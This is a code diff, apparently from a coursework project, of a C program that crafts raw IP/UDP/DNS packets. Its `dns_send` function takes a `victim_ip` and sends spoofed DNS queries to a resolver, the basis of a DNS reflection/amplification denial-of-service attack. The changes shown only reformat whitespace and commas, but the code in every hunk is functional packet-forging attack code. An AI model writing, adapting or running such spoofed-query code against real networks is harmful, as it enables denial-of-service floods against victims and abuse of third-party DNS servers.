@@ -8,7 +8,7 @@
 #include <arpa/inet.h>
 #include <sys/time.h>
 #include <time.h>
-#define PKT_LEN 8192// The packet length
+#define PKT_LEN 8192 // The packet length
 #define SA struct sockaddr
 #define SA_in struct sockaddr_in
 //ref: http://www.tsnien.idv.tw/Internet_WebBook/chap13/13-6%20DNS%20%E8%A8%8A%E6%81%AF%E6%A0%BC%E5%BC%8F.html
@@ -51,7 +51,7 @@ typedef struct{
 	unsigned short datalen;
 }addition;
 
-unsigned short csum(unsigned short *ptr,int nbytes) {
+unsigned short csum(unsigned short *ptr, int nbytes) {
 	register long sum;
 	unsigned short oddbyte;
 	register short answer;
@@ -70,8 +70,8 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 	answer = (short)~sum;
 	return answer;
 }// copy from https://www.binarytides.com/raw-udp-sockets-c-linux/
-void format_query_name(unsigned char *query_name,int select){
-	unsigned char dns_record[3][32] = {"ieee.org.","sandia.gov.","nctu.edu.tw."};
+void format_query_name(unsigned char *query_name, int select){
+	unsigned char dns_record[3][32] = {"ieee.org.", "sandia.gov.", "nctu.edu.tw."};
 	int i,j,beg = 0;
 	for(i = 0;i < strlen((char *)dns_record[select]);i++)
 		if(dns_record[select][i] == '.'){
@@ -82,7 +82,7 @@ void format_query_name(unsigned char *query_name,int select){
 		}
 	*query_name = 0x00;
 }
-int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port,int select){
+int dns_send(char *victim_ip, int udp_src_port, char *dns_ip, int dns_port, int select){
 	char datagram[PKT_LEN];
 
 	// format DNS header
@@ -98,7 +98,7 @@ int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port,int sele
 	// format Question sec.
 	unsigned char *qname; // question_name
 	qname = (unsigned char *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr)]; // padding qname after dns
-	format_query_name(qname,select);
+	format_query_name(qname, select);
 	query *q;
 	// padding qname after dns,qname, the 1 is because last 0 in qname cant count by strlen
 	q = (query *)&datagram[sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen((char *)qname) + 1)];
@@ -149,29 +149,29 @@ int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port,int sele
 	pse.len = htons(pse_len);
 	char *pse_data = malloc(sizeof(pseh) + pse_len);
 	memcpy(pse_data, (char *)&pse, sizeof(pseh));
-	memcpy(pse_data + sizeof(pseh),udp,pse_len);
-	udp->check = csum((unsigned short *)pse_data,sizeof(pseh) + pse_len); // calculate udp checksum
+	memcpy(pse_data + sizeof(pseh), udp,pse_len);
+	udp->check = csum((unsigned short *)pse_data, sizeof(pseh) + pse_len); // calculate udp checksum
 
 	// create socket & send
 	SA_in sin; // sockaddr_in
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(dns_port);
 	sin.sin_addr.s_addr = inet_addr(dns_ip);
-	int sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW),one = 1; // socket file descriptor
+	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW),one = 1; // socket file descriptor
 	const int *val = &one;
-	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) == -1){
-        printf("[*] Get error in setsockopt\n");
-        return -1;
-    }
+	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1){
+		printf("[*] Get error in setsockopt\n");
+		return -1;
+	}
 	if(sockfd == -1){
 		printf("[x] Could not create socket.\n");
 		return -1;
 	}
 	else
-		sendto(sockfd,datagram,ip->tot_len,0,(SA *)&sin,sizeof(sin));
+		sendto(sockfd, datagram, ip->tot_len, 0, (SA *)&sin, sizeof(sin));
 
-    close(sockfd);
-    free(pse_data);
+	close(sockfd);
+	free(pse_data);
 
 	return 0;
 }
